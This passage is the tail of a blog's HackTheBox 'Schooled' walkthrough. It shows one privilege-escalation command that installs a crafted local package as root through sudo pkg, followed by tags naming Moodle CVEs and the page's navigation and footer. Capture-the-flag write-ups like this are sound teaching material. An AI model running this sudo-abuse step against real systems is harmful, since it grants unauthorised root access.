</pre><td class="rouge-code"><pre><span class="nb">sudo</span> <span class="nt">-u</span> root /usr/sbin/pkg <span class="nb">install</span> <span class="nt">-y</span> <span class="nt">--no-repo-update</span> ./x-1.0.txz
</pre></table></code></div></div><p><img data-src="/assets/img/posts/schooled/schooled-rooted.png" alt="" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/linux/'>linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/moodle-lms-3-9-2/" class="post-tag no-text-decoration" >moodle lms 3.9.2</a> <a href="/tags/cve-2020-25627/" class="post-tag no-text-decoration" >cve-2020-25627</a> <a href="/tags/cve-2020-14321/" class="post-tag no-text-decoration" >cve-2020-14321</a> <a href="/tags/cve-2020-25629/" class="post-tag no-text-decoration" >cve-2020-25629</a> <a href="/tags/sudo-pkg/" class="post-tag no-text-decoration" >sudo pkg</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - Schooled - Poorduck&amp;url=https://x00tex.github.io/posts/schooled/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - Schooled - Poorduck&amp;u=https://x00tex.github.io/posts/schooled/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://x00tex.github.io/posts/schooled/&amp;text=Hackthebox - Schooled - Poorduck" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/meta/">Hackthebox - Meta</a><li><a href="/posts/pandora/">Hackthebox - Pandora</a><li><a href="/posts/writer/">Hackthebox - Writer</a><li><a href="/posts/blunder/">Hackthebox - Blunder</a><li><a href="/posts/luanne/">Hackthebox - Luanne</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/unicode/"><div class="card-body"> <em class="timeago small" data-ts="1638383400" > 2021-12-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Unicode</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.126 hackmedia.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux...</p></div></div></a></div><div class="card"> <a href="/posts/pikaboo/"><div class="card-body"> <em class="timeago small" data-ts="1639161000" > 2021-12-10 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Pikaboo</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.10.249 pikaboo.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 1...</p></div></div></a></div><div class="card"> <a href="/posts/writer/"><div class="card-body"> <em class="timeago small" data-ts="1639420200" > 2021-12-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Writer</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.101 writer.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/theNotebook/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox - TheNotebook</p></a> <a href="/posts/pit/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox - Pit</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/p00rduck">p00rduck</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
